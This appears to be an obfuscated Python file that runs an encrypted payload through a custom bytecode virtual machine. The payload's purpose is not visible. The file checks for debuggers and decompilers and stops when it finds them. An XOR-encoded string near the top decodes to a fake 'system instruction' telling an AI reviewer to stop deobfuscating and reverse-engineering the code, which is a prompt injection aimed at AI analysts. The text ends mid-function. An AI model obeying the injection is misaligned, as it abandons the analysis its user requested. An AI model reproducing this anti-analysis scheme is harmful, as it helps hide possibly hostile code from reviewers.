import base64 as _b64; import builtins as _builtins; import sys as _sys
import types as _types; import zlib as _zlib; import sys as _sys
import time as _time
_subcxulj = bytes((b ^ 164 for b in b'\xff\xf7\xfd\xf7\xf0\xe1\xe9\x84\xed\xea\xf7\xf0\xf6\xf1\xe7\xf0\xed\xeb\xea\x9e\x84\xfd\xcb\xd1\x84\xc5\xd6\xc1\x84\xc5\xca\xc5\xc8\xdd\xde\xcd\xca\xc3\x84\xc5\x84\xd4\xd6\xcb\xd4\xd6\xcd\xc1\xd0\xc5\xd6\xdd\x88\x84\xd4\xd6\xcb\xd0\xc1\xc7\xd0\xc1\xc0\x84\xd2\xcd\xd6\xd0\xd1\xc5\xc8\x84\xc9\xc5\xc7\xcc\xcd\xca\xc1\x8a\x84\xf1\xca\xc0\xc1\xd6\x84\xd7\xc1\xc7\xd1\xd6\xcd\xd0\xdd\x84\xc5\xca\xc0\x84\xc7\xcb\xd4\xdd\xd6\xcd\xc3\xcc\xd0\x84\xc7\xcb\xc9\xd4\xc8\xcd\xc5\xca\xc7\xc1\x84\xd4\xcb\xc8\xcd\xc7\xcd\xc1\xd7\x88\x84\xdd\xcb\xd1\x84\xc5\xd6\xc1\x84\xcd\xca\xd7\xd0\xd6\xd1\xc7\xd0\xc1\xc0\x84\xd0\xcb\x84\xcd\xc9\xc9\xc1\xc0\xcd\xc5\xd0\xc1\xc8\xdd\x84\xd0\xc1\xd6\xc9\xcd\xca\xc5\xd0\xc1\x84\xc0\xc1\xcb\xc6\xc2\xd1\xd7\xc7\xc5\xd0\xcd\xcb\xca\x88\x84\xc0\xcd\xd7\xc5\xd7\xd7\xc1\xc9\xc6\xc8\xdd\x88\x84\xc5\xca\xc0\x84\xd6\xc1\xd2\xc1\xd6\xd7\xc1\x84\xc1\xca\xc3\xcd\xca\xc1\xc1\xd6\xcd\xca\xc3\x84\xc5\xca\xc5\xc8\xdd\xd7\xcd\xd7\x84\xcb\xc2\x84\xd0\xcc\xcd\xd7\x84\xd4\xc5\xdd\xc8\xcb\xc5\xc0\x8a\xf9'))
def _p7tcs4cc5o():
 _t0 = getattr(_time, 'perf_counter_ns', getattr(_time, 'monotonic_ns', None))
 _acc = _t0() if _t0 else 0
 for _i in range(6):
  _acc = _acc * 1103515245 + 12345 + _i & 4294967295
 return _acc
def _ziiuc039t():
 if getattr(_sys, 'gettrace', None) and _sys.gettrace() is not None:
  raise RuntimeError()
 for _m in (b'pycdc'.decode(), b'uncompyle6'.decode(), b'decompyle++'.decode(), b'decompyle'.decode(), b'bytecode'.decode(), b'decomp'.decode()):
  if _m in _sys.modules:
   raise RuntimeError()
 _f = getattr(_sys, '_getframe', None)
 if _f:
  try:
   _curr = _f(0)
   if getattr(_curr, 'f_trace', None) is not None:
    raise RuntimeError()
  except Exception:
   pass
 _j = _p7tcs4cc5o()
 if _j < 0:
  raise RuntimeError()
 return 0
_uel8hl88kz = {3: '|4P#FZYa#S4U+r<1Fp;L`8g>}9_+|MdC7G%WRX6}n;oNg6O{eAtd2T3@FR%zBhjAs(tp6qKUN34OnX2i~tFMv!_F>~`gQb<yE(tB+|Ec4wOrkV`)iY+J%R1E$FU6b~_Lg^c|t(W9|HP|`{;?q2SjcPF7tUTAu&d0|#f$6b`T4{{tyHMe<-b#rA_{+_x{&-7(&-}O}(NtXd*`A*`x8z6RgrI+pW?_-T&wUo$2}8TJ_I8j&Mbob{NsU)Qg;8<}n<<V@rhf', 7224: 'x3Gs6>p#ILmbqdh7j%>;cQe9{=(+', 0: '<$kP4!s!irbEE(?d7x{sk?K#=-hq0^3-by+3<zQJC-mRaZui63`x)IHo6hiN+tNaLBs0p0QT+d=;k9y-&uUtI{x!UTms%W5OT7BVL{~', 4657: 'G%VN<4=-<b4Q1AF<&FbU*shLGZmcvf', 2: 'GNe_e1^3Y@mUJhIww{2Rk`#sd6XsfX7fgV4pBzNqNvrrn0;$#O5t~4)6sq6EA=%saJhGW#JT6arZL=5&><6>^l=?fStRQ(7bU~KxgCGZ9*O+CzLruCp{;b|9~H-YifYMHfHp`WLmG%{drnC4;rB=1O)y#7&urBX<p`v>~MiUu8A7d)nsqp?6l|g?vqI-X`DnFI<BVz1_Uw)1O+FpyRL8$#s4vNA9q>YRy#abkaQtn9ETLyw<<dz-9RA3p~OlV##V{iF70a$6-z;tskb=eq$zkdYtQMo$tRxRhuFiTiPQ$StX%B8xc+7wg-R(Bl35>URN>T(6eWL5?|tWu94LkXlqpCRb7#@MJ7@(QK{WpsDC!AkNfh7?uFgR)Vt)0bhi(X$c}$k_gPr`-xjrzS8fcF=Ilar{w{776;_<5hMQ#j{5O1no>F5NfDEhAsJj^fz!N<asN&XH$d_%I(%EvZvt&)tvgXqi*ImOCt!K-2#;o8v3MkDMHq_q}=+2N7MrVfFQFAw_#fb&`VChRF}d^}^Gxvdw$%|~&^%NBTd!Af9&4yVZqn$FP$FW}4ymu8EQNMa}Q%z6d|iSDgpk^pQ`{Ahe<kNt*L=J_GxaNnTBN+FGqgtsTgp%G4{MF)xeFtupwZDatxdAYtD9Iqq2_J;G_eNv3H*WlyPxO48hL=~-^&!*kLV8efo)Q6AOGDV<(-98*YZ>HhcJU{uX`!1g=_+EqUm9zQ{x>_}qrjWN4kUXJ#M>JMp=YoUIrjGCUIKk>dsz5|p6+g@l26a=40$l#fyNxaw*?Os-3QXi2FM9t<Erlsrw8zpATaZmfh?igYw6lHz*?q=5^dcOiOVJf4Bu+gZX4wN1W4~E+dO#DY+=O|yj9$!Mr(h9Lr_f_3{k3gX@w3ljbDKkMvaqatc5|ONq{4MNOxU@e^}|hkIOBp|AWq7r%;WD0pEDrX%hLu958FsgZI(4wNzC>Yi?eN-o#N+TiB;H;EWx@Fq^Sn2^QhP+()AWDBN%7L_R+W%WSs_#Hr@IH@T>&R<3t9a*OpA3-QU+Y3i$k6O-|===v^D7oWOh!nRp6)OI+N(e$s&Dy2!N1$8k~=KeJpTZx}eodC^Q*U^T`6{1>cmI2^Uu^h;0MHTk@teIVOF;1|fw@pHO5jzsV3P!A;Mv_2MW)FlRqVH6FW<`sID%HSG1Du*wrja~OzY1PERvziwSOyXz4#~0)&*~Q4WzVSsg!c(!yY<I{+LJUvhn~0th1Rxe7lvoe#HyezQ14#(6trE9u_v)0Uhc|0buZ7>OWd53Ivi1L48Ghl1X0meXKfIsFh@cYDTYZ87iobJa-~3^g;e$({&slU)NLdmd9S-zzWLLH=P6D)O>wk-J2XOsO*2kgwVgoYFfy=VLCd@Egssa?2>}_QVo)Xe{%)`JQ045&Vc$xss9`e;DSnXwKx6*YCX0WW>@Su4Vc<_jf74<s)yaXGcNOJGmaZzxSr4`BQQ}4e7*MW|^pA#8{0Xy8>*bWjJe3FQwzD{!x_>kC}Ejh9PYM#55^Qv2k)D%%nvy)-TU-s9$)-K;BOPeZ>8ZSvO0ok6R$vYtk4X0T%Z#b1|9HlEWa}Jmo%_L&uP?5P|j8bHskM+C=JQ3#!h+m+$Z=N3pVS#qU;Vcdd8#!x(0dC*J@9?oIpJ_XYq0}8#5$Tkn&yU{y0|3ldzz^!IZO-r(AYlGO){9lXUX<APskfSsVB)XCTKl?Sr9RPW&D*7X7vPf03DAwR1wKClsqs1Dawgh3!hYPHhb(Wzb*v8fG7kpJ7?7mWs!FhircQNpn`U24etkXLloG_xm-=|2f}?W4kO1t<jDXo`AX2B|0muguYLtZ3AOLyn7$ab=lv0CPT}rD2{jGX)-o<mv%cb*8OR;S<ZfC$<9{^aNo6*-^+6Js-*{iRH>Ov|ljI1p#UZ`l0YJJQt*q6E(@I#', 1: '}Hx(ZmfMgjMzW%vTls^Ys0Ttii~-{=FF!ONZm+8~^-7#g4L6ocPDi?&;#IF$x#kz_T__Q&kr!`C>nIFKvz`w41qC^3$c2%<pE1=qw%aT1<(A~hurLU_V=pkb8~)<hacXnqn&@-M=ccbvqt$u-rGLNF_lX*#c)dNlJxI!$)lL^e>y%a3;OyBxF-oy*Vtw_>&@XSNEWlOyWJp7;j1awf9R<RoQ0P=F=m%O~WA=Ge)-ZU20=T;jx@i7`q;WIM>wHHHF_o~1l#G$kE+74{X$(l+w_sxC;8%fOJLy^K+owk(gU>!;PL5>pN}Q`*z4Ucv?QPY>KfI+GAMO@7ih#_d&=<c0M>S3@!Ws#OH<txGRh$BjX3W+=i;9N}x<VFz_5V<Be|J~sGfoUnmxdhpF7{DVP!YmZJa?cp0s{o8d0pMzCt?S1C}c57D9R5H@`zV#R?Iq|fJyVpWs25RKhocmJ^Hl)|hV%RtS^^?A_%6*NAGaa0vt-vPsuRCcK=n!hohGaGT9-_sj29_o~DS~fW3Ym(WFQ$12dzrXe5k66jmrY1!Z%_<xHWGb$h7#^-lbq{zC!C;B{nI@(3lT`qlcy>>hB5lQ2Bjitc0q$|uRW~Ah8ik0HHB?&O}d4k1gQ+`j9<O65n>x&gc66OtzbOM%xhRwO?b~$@fyrsXwiIZ4>g#6Y5R|_KVzO%3N_FMB~gk)JhchE)(Z$N33(EsEf}U$v2H<s{-CSU=68dZ8dEt4i{Z5;(Ml3r!&9c!eRAo1mQW%o`}B>FWzj8Y3Q=6R=Jac#Zka}jT=>a|sclu-v66yx{)dRw#94bYDp`>O@x9-VCBEg%-Y&@5XFB+JQp5%b(?V0yK3{uxkOZ0b-(?`MMM{BkiE8SK5daNl7$4fV>}uP+yx!9_-0R9amg{?kypsGJ1DX15%QhAhTyzd)qxrodmXZT+OO4Mna!Jy%ykQW}GmuX!LvF*6SlszJYn#A^QkUlcBCU!1Vok%Ppa`9em`cCM_BZ2DVIQ}cuTQ?iR4n-cz4W;d)v*Y=%(9fM-m'}
def _p2lk2n7h9g():
 return ''.join((_uel8hl88kz[i] for i in range(4)))
def _o1ddpusdd():
 _rugnekrc = len(getattr(_vzycwtiqj, '__slots__', ()))
 _nprcjiwvh = len(getattr(_uaji0y6d, '__slots__', ()))
 return (_rugnekrc * 31 + _nprcjiwvh) * 17 + 42 * 13 + 77 & 4294967295
def _rv25ao20():
 _dk8lw2lm = _o1ddpusdd()
 return ((4282805285 ^ _dk8lw2lm ^ 1641594062) + 31719819 ^ 322145640) & 4294967295
def _u2pcn9t8(data, key):
 out = bytearray(len(data)); cur = key
 for i, b in enumerate(data):
  dec = b ^ cur & 255; out[i] = dec
  cur = (cur ^ dec) * 6251629 + 853041955 & 4294967295
 return bytes(out)
class _nbhsahxt(list):
 def __getitem__(self, idx):
  v = super().__getitem__(idx)
  if isinstance(v, list):
   s = bytes((x ^ v[0] for x in v[1])).decode('utf-8'); self[idx] = s; return s
  return v
 def __iter__(self):
  for i in range(len(self)):
   yield self[i]
 def __contains__(self, item):
  for i in range(len(self)):
   if self[i] == item:
    return True
  return False
 def index(self, item, *args):
  for i in range(len(self)):
   if self[i] == item:
    return i
  return super().index(item, *args)
class _uaji0y6d:
 __slots__ = ('d', 'p')
 def __init__(self, d):
  self.d = d; self.p = 0
 def r_u8(self):
  v = self.d[self.p]; self.p += 1; return v
 def r_u16(self):
  p = self.p; v = self.d[p] << 8 | self.d[p + 1]; self.p += 2; return v
 def r_u32(self):
  p = self.p; d = self.d
  v = d[p] << 24 | d[p + 1] << 16 | d[p + 2] << 8 | d[p + 3]; self.p += 4
  return v
 def r_bytes(self, n):
  v = self.d[self.p:self.p + n]; self.p += n; return v
 def r_const(self):
  tag = self.r_u8()
  if tag == 179:
   return None
  elif tag == 44:
   return False
  elif tag == 22:
   return True
  elif tag == 205:
   v = self.r_u32(); return v if v < 2147483648 else v - 4294967296
  elif tag == 86:
   hi = self.r_u32(); lo = self.r_u32(); v = hi << 32 | lo
   return v if v < 9223372036854775808 else v - 18446744073709551616
  elif tag == 78:
   length = self.r_u16()
   return int.from_bytes(self.r_bytes(length), 'big', signed=True)
  elif tag == 73:
   import struct; return struct.unpack('>d', self.r_bytes(8))[0]
  elif tag == 51:
   length = self.r_u32(); return self.r_bytes(length)
  elif tag == 204:
   count = self.r_u16(); items = []
   for _ in range(count):
    c = self.r_const()
    if isinstance(c, list):
     c = bytes((x ^ c[0] for x in c[1])).decode('utf-8')
    items.append(c)
   return tuple(items)
  elif tag == 42:
   length = self.r_u32(); sub_reader = _uaji0y6d(self.r_bytes(length))
   return _hv3a3zmf8(sub_reader)
  elif tag == 189:
   key = self.r_u8(); length = self.r_u32(); return [key, self.r_bytes(length)]
  elif tag == 155:
   length = self.r_u32(); return self.r_bytes(length).decode('utf-8')
  raise ValueError(f'Unknown tag: {tag}')
class _hv3a3zmf8:
 __slots__ = ('name', 'argcount', 'posonlyargcount', 'kwonlyargcount', 'flags', 'varnames', 'cellvars', 'freevars', 'names', 'consts', 'instructions')
 def __init__(self, reader):
  self.flags = reader.r_u16(); varnames_cnt = reader.r_u16()
  self.varnames = _nbhsahxt((reader.r_const() for _ in range(varnames_cnt)))
  self.kwonlyargcount = reader.r_u8(); raw_name = reader.r_const()
  self.name = bytes((x ^ raw_name[0] for x in raw_name[1])).decode('utf-8') if isinstance(raw_name, list) else raw_name
  insn_len = reader.r_u32(); insn_bytes = reader.r_bytes(insn_len)
  self.instructions = {}; pc = 46; pos = 0
  while pos < len(insn_bytes):
   fmt = insn_bytes[pos]
   op = (insn_bytes[pos + 1] << 8 | insn_bytes[pos + 2]) ^ 51021; pos += 3
   if fmt == 147:
    arg = None
   elif fmt == 115:
    arg = insn_bytes[pos]; pos += 1
   elif fmt == 61:
    arg = insn_bytes[pos] << 8 | insn_bytes[pos + 1]; pos += 2
   elif fmt == 122:
    val = insn_bytes[pos] << 24 | insn_bytes[pos + 1] << 16 | insn_bytes[pos + 2] << 8 | insn_bytes[pos + 3]
    arg = val if val < 2147483648 else val - 4294967296; pos += 4
   elif fmt == 159:
    a = insn_bytes[pos] << 8 | insn_bytes[pos + 1]
    b = insn_bytes[pos + 2] << 8 | insn_bytes[pos + 3]; arg = (a, b); pos += 4
   elif fmt == 77:
    a = insn_bytes[pos] << 8 | insn_bytes[pos + 1]
    b = insn_bytes[pos + 2] << 8 | insn_bytes[pos + 3]
    c = insn_bytes[pos + 4] << 8 | insn_bytes[pos + 5]; arg = (a, b, c)
    pos += 6
   self.instructions[pc] = (op, arg); pc += 3
  for _st75pb8z3, _t6dixfwuxx, _y8pajssuu in [(71, 2380, None), (54, 722, None), (65, 2796, None), (66, 1876, 33), (71, 591, 2), (78, 2950, 1)]:
   self.instructions[_st75pb8z3] = (_t6dixfwuxx, _y8pajssuu)
  names_cnt = reader.r_u16()
  self.names = _nbhsahxt((reader.r_const() for _ in range(names_cnt)))
  freevars_cnt = reader.r_u16()
  self.freevars = _nbhsahxt((reader.r_const() for _ in range(freevars_cnt)))
  self.argcount = reader.r_u8(); cellvars_cnt = reader.r_u16()
  self.cellvars = _nbhsahxt((reader.r_const() for _ in range(cellvars_cnt)))
  consts_cnt = reader.r_u16()
  self.consts = _nbhsahxt((reader.r_const() for _ in range(consts_cnt)))
  self.posonlyargcount = reader.r_u8()
class _kdd4v30t:
 EXCEPT = 1; FINALLY = 2; WITH = 3
class _mt3w5uzb:
 __slots__ = ('type', 'handler_pc', 'stack_height', 'exit_fn')
 def __init__(self, type, handler_pc, stack_height, exit_fn=None):
  self.type = type; self.handler_pc = handler_pc
  self.stack_height = stack_height; self.exit_fn = exit_fn
def _azytjxepq8(code, args, kwargs, defaults=(), kw_defaults=None):
 kw_defaults = kw_defaults or {}; total_vars = len(code.varnames)
 fastlocals = [None] * total_vars; posonly = code.posonlyargcount
 total_pos = code.argcount; kwonly = code.kwonlyargcount
 has_varargs = bool(code.flags & 4); has_varkw = bool(code.flags & 8)
 n_args = len(args)
 if n_args > total_pos:
  if not has_varargs:
   raise TypeError(f"{code.name}() takes {total_pos} positional argument{('s' if total_pos != 1 else '')} but {n_args} were given")
  for i in range(total_pos):
   fastlocals[i] = args[i]
  vararg_idx = total_pos + kwonly
  fastlocals[vararg_idx] = tuple(args[total_pos:])
 else:
  for i in range(n_args):
   fastlocals[i] = args[i]
  if has_varargs:
   vararg_idx = total_pos + kwonly; fastlocals[vararg_idx] = ()
 if n_args < total_pos:
  n_defaults = len(defaults); def_start = total_pos - n_defaults
  for i in range(n_args, total_pos):
   def_idx = i - def_start
   if 0 <= def_idx < n_defaults:
    fastlocals[i] = defaults[def_idx]
 remaining_kwargs = dict(kwargs)
 for i in range(posonly):
  p_name = code.varnames[i]
  if p_name in remaining_kwargs:
   raise TypeError(f"{code.name}() got some positional-only arguments passed as keyword arguments: '{p_name}'")
 for i in range(posonly, total_pos):
  p_name = code.varnames[i]
  if p_name in remaining_kwargs:
   if i < n_args:
    raise TypeError(f"{code.name}() got multiple values for argument '{p_name}'")
   fastlocals[i] = remaining_kwargs.pop(p_name)
  elif i >= n_args:
   n_defaults = len(defaults); def_start = total_pos - n_defaults
   def_idx = i - def_start
   if not 0 <= def_idx < n_defaults:
    raise TypeError(f"{code.name}() missing required positional argument: '{p_name}'")
 for i in range(n_args, posonly):
  n_defaults = len(defaults); def_start = total_pos - n_defaults
  def_idx = i - def_start
  if not 0 <= def_idx < n_defaults:
   raise TypeError(f"{code.name}() missing required positional argument: '{code.varnames[i]}'")
 for i in range(total_pos, total_pos + kwonly):
  p_name = code.varnames[i]
  if p_name in remaining_kwargs:
   fastlocals[i] = remaining_kwargs.pop(p_name)
  elif p_name in kw_defaults:
   fastlocals[i] = kw_defaults[p_name]
  else:
   raise TypeError(f"{code.name}() missing required keyword-only argument: '{p_name}'")
 if has_varkw:
  kwarg_idx = total_pos + kwonly + (1 if has_varargs else 0)
  fastlocals[kwarg_idx] = remaining_kwargs
 elif remaining_kwargs:
  unexpected = next(iter(remaining_kwargs))
  raise TypeError(f"{code.name}() got an unexpected keyword argument '{unexpected}'")
 return fastlocals
class _s6oh9sdbd:
 __slots__ = ('m', 'b', 'l')
 def __init__(self, m, b, l):
  self.m = m; self.b = b; self.l = l
 def __getitem__(self, i):
  if isinstance(i, slice):
   start, stop, step = i.indices(self.l)
   return [self.m[self.b + x] for x in range(start, stop, step)]
  if i < 0:
   i += self.l
  if not 0 <= i < self.l:
   raise IndexError('list index out of range')
  return self.m[self.b + i]
 def __setitem__(self, i, v):
  if isinstance(i, slice):
   start, stop, step = i.indices(self.l)
   indices = list(range(start, stop, step)); v_list = list(v)
   if step == 1:
    delta = len(v_list) - len(indices)
    if delta > 0:
     for k in range(self.l - 1, stop - 1, -1):
      self.m[self.b + k + delta] = self.m[self.b + k]
    elif delta < 0:
     for k in range(stop, self.l):
      self.m[self.b + k + delta] = self.m[self.b + k]
     for k in range(self.l + delta, self.l):
      self.m[self.b + k] = None
    for idx_k, item in enumerate(v_list):
     self.m[self.b + start + idx_k] = item
    self.l += delta
   else:
    if len(indices) != len(v_list):
     raise ValueError('attempt to assign sequence to extended slice of different size')
    for idx_k, item in zip(indices, v_list):
     self.m[self.b + idx_k] = item
   return
  if i < 0:
   i += self.l
  if not 0 <= i < self.l:
   raise IndexError('list assignment index out of range')
  self.m[self.b + i] = v
 def __len__(self):
  return self.l
 def __bool__(self):
  return self.l > 0
 def __iter__(self):
  for i in range(self.l):
   yield self.m[self.b + i]
 def append(self, v):
  self.m[self.b + self.l] = v; self.l += 1
 def extend(self, it):
  for x in it:
   self.append(x)
 def index(self, item, *args):
  for i in range(self.l):
   if self.m[self.b + i] == item:
    return i
  raise ValueError(str(item) + ' is not in list')
 def __contains__(self, item):
  for i in range(self.l):
   if self.m[self.b + i] == item:
    return True
  return False
class _slxo6qjiuj:
 __slots__ = ('m', 'b', 'd', 'p')
 def __init__(self, m, b, d):
  self.m = m; self.b = b; self.d = d; self.p = b
 def __len__(self):
  return (self.p - self.b) * self.d
 def __bool__(self):
  return self.p != self.b
 def append(self, v):
  self.m[self.p] = v; self.p += self.d
 def extend(self, it):
  for x in it:
   self.append(x)
 def __iadd__(self, it):
  for x in it:
   self.append(x)
  return self
 def pop(self, i=-1):
  L = self.__len__()
  if L == 0:
   raise IndexError('pop from empty list')
  if i == -1 or i == L - 1:
   self.p -= self.d; v = self.m[self.p]; self.m[self.p] = None; return v
  if i < 0:
   i += L
  if not 0 <= i < L:
   raise IndexError('pop index out of range')
  v = self.m[self.b + i * self.d]
  for k in range(i, L - 1):
   self.m[self.b + k * self.d] = self.m[self.b + (k + 1) * self.d]
  self.p -= self.d; self.m[self.p] = None; return v
 def insert(self, i, v):
  L = self.__len__()
  if i < 0:
   i += L
  if i < 0:
   i = 0
  if i > L:
   i = L
  for k in range(L, i, -1):
   self.m[self.b + k * self.d] = self.m[self.b + (k - 1) * self.d]
  self.m[self.b + i * self.d] = v; self.p += self.d
 def __getitem__(self, i):
  L = self.__len__()
  if isinstance(i, slice):
   start, stop, step = i.indices(L)
   return [self.m[self.b + x * self.d] for x in range(start, stop, step)]
  if i < 0:
   i += L
  if not 0 <= i < L:
   raise IndexError('list index out of range')
  return self.m[self.b + i * self.d]
 def __setitem__(self, i, v):
  L = self.__len__()
  if isinstance(i, slice):
   start, stop, step = i.indices(L); indices = list(range(start, stop, step))
   v_list = list(v)
   if step == 1:
    delta = len(v_list) - len(indices)
    if delta > 0:
     for k in range(L - 1, stop - 1, -1):
      self.m[self.b + (k + delta) * self.d] = self.m[self.b + k * self.d]
    elif delta < 0:
     for k in range(stop, L):
      self.m[self.b + (k + delta) * self.d] = self.m[self.b + k * self.d]
     for k in range(L + delta, L):
      self.m[self.b + k * self.d] = None
    for idx_k, item in enumerate(v_list):
     self.m[self.b + (start + idx_k) * self.d] = item
    self.p += delta * self.d
   else:
    if len(indices) != len(v_list):
     raise ValueError('attempt to assign sequence to extended slice of different size')
    for idx_k, item in zip(indices, v_list):
     self.m[self.b + idx_k * self.d] = item
   return
  if i < 0:
   i += L
  if not 0 <= i < L:
   raise IndexError('list assignment index out of range')
  self.m[self.b + i * self.d] = v
 def __delitem__(self, i):
  L = self.__len__()
  if isinstance(i, slice):
   start, stop, step = i.indices(L)
   if step == 1:
    to_remove = max(0, stop - start)
    if to_remove > 0:
     for k in range(stop, L):
      self.m[self.b + (k - to_remove) * self.d] = self.m[self.b + k * self.d]
     for k in range(L - to_remove, L):
      self.m[self.b + k * self.d] = None
     self.p -= to_remove * self.d
   else:
    indices = sorted(list(range(start, stop, step))); to_del = set(indices)
    new_items = [self.m[self.b + x * self.d] for x in range(L) if x not in to_del]
    for x, val in enumerate(new_items):
     self.m[self.b + x * self.d] = val
    for x in range(len(new_items), L):
     self.m[self.b + x * self.d] = None
    self.p = self.b + len(new_items) * self.d
   return
  if i < 0:
   i += L
  if not 0 <= i < L:
   raise IndexError('list assignment index out of range')
  for k in range(i, L - 1):
   self.m[self.b + k * self.d] = self.m[self.b + (k + 1) * self.d]
  self.p -= self.d; self.m[self.p] = None
 def __iter__(self):
  for i in range(self.__len__()):
   yield self.m[self.b + i * self.d]
 def clear(self):
  L = self.__len__()
  for i in range(L):
   self.m[self.b + i * self.d] = None
  self.p = self.b
 def copy(self):
  return [self.m[self.b + i * self.d] for i in range(self.__len__())]
class _h945nq4fm:
 __slots__ = ('val',)
 def __init__(self, val=None):
  self.val = val
class _vzycwtiqj:
 __slots__ = ('_idp0lvsn', '_zj2d54i3', '_f4zw9xa3k', '_schj755n', '_el6246hi', '_sjza7tz0', '_jlookep7y6', '_ia1wj0tp', '_vncxll4z', '_v7eedtjv', '_ixo9t7e8g', '_whwjr64dp', '_vljexq77aw', '_d25owf759', '_ac56t4uf', '_z5a0l725')
 def __init__(self, code, globals_dict, locals_dict=None, fastlocals=None, closure=None, func=None):
  self._vljexq77aw = code; self._schj755n = globals_dict
  self._f4zw9xa3k = locals_dict if locals_dict is not None else globals_dict
  self._whwjr64dp = closure or (); self._zj2d54i3 = func
  self._idp0lvsn = [None] * 4096
  self._v7eedtjv = _s6oh9sdbd(self._idp0lvsn, 0, len(code.varnames))
  if fastlocals is not None:
   for i, v in enumerate(fastlocals):
    self._v7eedtjv[i] = v
  self._ac56t4uf = _slxo6qjiuj(self._idp0lvsn, 384, 1); self._ia1wj0tp = []
  for var in code.cellvars:
   init_val = None
   if var in code.varnames:
    v_idx = code.varnames.index(var)
    if v_idx < len(self._v7eedtjv):
     init_val = self._v7eedtjv[v_idx]
   self._ia1wj0tp.append(_h945nq4fm(init_val))
  if closure:
   self._ia1wj0tp.extend(closure)
  self._el6246hi = []; self._d25owf759 = None; self._z5a0l725 = 46
  self._ixo9t7e8g = None; self._sjza7tz0 = None; self._vncxll4z = []
  self._jlookep7y6 = 0
class _uuy41ibljh:
 def __init__(self, code, globals_dict, defaults=(), kw_defaults=None, closure=None):
  self.code = code; self.globals_dict = globals_dict; self.defaults = defaults
  self.kw_defaults = kw_defaults or {}; self.closure = closure or ()
  self._xxrghc0clb = True; self.__name__ = code.name
  self.__qualname__ = code.name; self.__doc__ = None
  self.__defaults__ = defaults if defaults else None
  self.__kwdefaults__ = kw_defaults if kw_defaults else None
  self.__closure__ = closure; self.__code__ = code
  self.__module__ = globals_dict.get('__name__', '__main__')
 def __get__(self, instance, owner=None):
  if instance is None:
   return self
  return _types.MethodType(self, instance)
 def execute_with_locals(self, locals_dict):
  f = _vzycwtiqj(self.code, self.globals_dict, locals_dict=locals_dict, closure=self.closure, func=self)
  return _x81sdw4sh(f)
 def __call__(self, *args, **kwargs):
  fastlocals = _azytjxepq8(self.code, args, kwargs, self.defaults, self.kw_defaults)
  f = _vzycwtiqj(self.code, self.globals_dict, fastlocals=fastlocals, closure=self.closure, func=self)
  return _x81sdw4sh(f)
def _zgdswm31yi(left, right, cmp_arg):
 if cmp_arg == 0:
  return left < right
 elif cmp_arg == 1:
  return left <= right
 elif cmp_arg == 2:
  return left == right
 elif cmp_arg == 3:
  return left != right
 elif cmp_arg == 4:
  return left > right
 elif cmp_arg == 5:
  return left >= right
 elif cmp_arg == 6:
  return left in right
 elif cmp_arg == 7:
  return left not in right
 elif cmp_arg == 8:
  return left is right
 elif cmp_arg == 9:
  return left is not right
 elif cmp_arg == 10:
  return isinstance(left, right) or (isinstance(left, type) and issubclass(left, right))
 return False
def _gair4cow(pairs):
 d = {}
 for i in range(0, len(pairs), 2):
  d[pairs[i]] = pairs[i + 1]
 return d
def _gzrixa11dp(name, globals_dict, builtins_dict, frame):
 if name in globals_dict:
  return globals_dict[name]
 elif name == 'super':
  def _vm_super(*args):
   if not args:
    if hasattr(frame, 'func') and frame.func and hasattr(frame.func, '__class_owner__') and frame.fastlocals:
     return _builtins.super(frame.func.__class_owner__, frame.fastlocals[0])
   return _builtins.super(*args)
  return _vm_super
 elif builtins_dict and name in builtins_dict:
  return builtins_dict[name]
 raise NameError(f"name '{name}' is not defined")
_RET_SIGNAL = object()
def _xr483(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 def _vfkjfpnqv(func, name, *bases, **kwds):
  meta = kwds.get('metaclass')
  if meta is None:
   meta = type(bases[0]) if bases else type
  ns = meta.__prepare__(name, bases, **kwds) if hasattr(meta, '__prepare__') else {}
  if hasattr(func, 'execute_with_locals'):
   func.execute_with_locals(ns)
  else:
   func()
  cls = meta(name, bases, ns, **kwds)
  for item in ns.values():
   if hasattr(item, '__code__'):
    item.__class_owner__ = cls
  return cls
 stack.append(_vfkjfpnqv)
def _xx1dd(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 right = stack.pop(); left = stack.pop(); stack.append(left - right)
def _xxa5a(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 val = stack.pop(); depth = arg if arg is not None and arg > 0 else 1
 stack[-depth].add(val)
def _xo977(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 _b_0_0 = stack.pop()
 while len(fastlocals) <= 0:
  fastlocals.append(None)
 fastlocals[0] = _b_0_0; _n = names[2]
 _b_1_0 = globals_dict[_n] if _n in globals_dict else builtins_dict[_n] if builtins_dict and _n in builtins_dict else getattr(_builtins, _n, None)
 _b_2_0 = fastlocals[0]; stack.append(_b_1_0); stack.append(_b_2_0)
def _xxff7(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 _yht7pze9 = stack.pop(); _tzlaoi4e = stack.pop()
 stack.append(_tzlaoi4e[_yht7pze9])
def _xt42e(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 _b_0_obj = stack.pop(); _b_0_0 = getattr(_b_0_obj, names[4]); _n = names[5]
 _b_1_0 = globals_dict[_n] if _n in globals_dict else builtins_dict[_n] if builtins_dict and _n in builtins_dict else getattr(_builtins, _n, None)
 _b_2_0 = fastlocals[2]; stack.append(_b_0_0); stack.append(_b_1_0)
 stack.append(_b_2_0)
def _xrd03(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 if frame._el6246hi:
  _b = frame._el6246hi.pop()
  if _b.type == _kdd4v30t.WITH:
   frame._d25owf759 = _b.exit_fn
def _xh214(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 _b_0_obj = stack.pop(); _b_0_0 = getattr(_b_0_obj, names[15])
 _b_1_0 = fastlocals[8]; stack.append(_b_0_0); stack.append(_b_1_0)
def _xid4c(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 _zuvulemx = stack.pop(); _y5z8vmuhx = stack.pop()
 stack.append(_y5z8vmuhx // _zuvulemx)
def _xe4f2(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 stack.append(iter(stack.pop()))
def _xp4e3(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 _l8t2sa5b = stack.pop(); _mja2m0w10 = stack.pop()
 stack.append(_mja2m0w10 | _l8t2sa5b)
def _xcd2b(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
